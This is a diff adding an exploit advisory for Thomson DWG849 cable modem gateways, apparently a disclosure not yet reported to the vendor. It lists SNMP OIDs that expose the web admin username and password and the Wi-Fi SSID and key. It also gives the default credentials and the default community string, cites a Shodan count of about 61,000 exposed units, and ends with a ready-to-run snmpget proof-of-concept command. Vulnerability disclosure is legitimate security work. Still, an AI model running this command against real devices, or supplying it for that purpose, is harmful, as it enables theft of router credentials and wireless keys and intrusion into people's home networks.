@@ -1,0 +1,76 @@
+# Exploit Title: Information Exposure via SNMP on Thomson CableHome Gateway
+[MODEL: DWG849] Cable Modem Gateway
+# Google Dork: n/a
+# Date: 09/18/2015
+# Exploit Author: Matt Dunlap
+# Vendor Homepage:
+http://www.technicolor.com/en/solutions-services/connected-home/modems-gateways
+# Software Link: n/a
+# Version: Thomson CableHome Gateway <<HW_REV: 1.0; VENDOR: Thomson; BOOTR:
+2.1.7i; SW_REV: STC0.01.16; MODEL: *DWG849*>>
+# Tested on: Ubuntu 14.04.3
+# CVE : Not reported to vendor (yet)
+
+Information Exposure via SNMP on Thomson CableHome Gateway [MODEL: DWG849]
+Cable Modem Gateway
+
+Affected Product:
+
+Thomson CableHome Gateway <<MODEL: DWG849>> Cable Modem Gateway
+
+NOTE: The model DWG850-4 is open to the same attack but doesn’t come with
+the remote administration enabled (no web interface, no telnet)
+
+Severity Rating:
+
+Important
+
+Impact:
+
+Username and password for the user interface as well as wireless network
+keys can be disclosed through SNMP.
+
+At the time of posting this there are 61,505 results on Shodan for this
+model.
+By default there are 2 open ports: 161 (snmp), 8080 (web administration)
+
+The default password of 4GIt3M has been set on every unit I’ve tested so far
+
+Description:
+
+The Thomson CableHome Gateway DWG849 Cable Modem Gateway product
+specifications include SNMP v2 & v3 under Network Management. The
+management information bases (MIBs) of various device subsystems on the
+DWG849 allows local\remote network users to discover user interface
+credentials and wireless network key values through simple SNMP requests
+for the value of these variables. Given the security authentication in
+SNMPv1 and SNMPv2c do not offer sufficient protection, this increases the
+risk that the values can be disclosed through SNMP using the default
+read-only community “private”.
+
+Object Identifiers (OIDs):
+
+Make, Model, Software Version:
+1.3.6.1.2.1.1.1.0
+1.3.6.1.2.1.1.3.0
+
+Web Interface Username \ Password (DEFAULT: admin \ Uq-4GIt3M)
+1.3.6.1.4.1.4491.2.4.1.1.6.1.1.0
+1.3.6.1.4.1.4491.2.4.1.1.6.1.2.0
+
+SSID and KEY
+1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.3.32
+1.3.6.1.4.1.4413.2.2.2.1.5.4.2.4.1.2.32
+
+Guest Network OIDs
+Other OIDs of interest include
+1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.3.33
+1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.3.34
+1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.3.35
+
+[POC]
+snmpget -t15 -v 2c -c private [host] 1.3.6.1.4.1.4491.2.4.1.1.6.1.1.0
+1.3.6.1.4.1.4491.2.4.1.1.6.1.2.0 1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.3.32
+1.3.6.1.4.1.4413.2.2.2.1.5.4.2.4.1.2.32
+
+This issue has not been reported to the vendor.
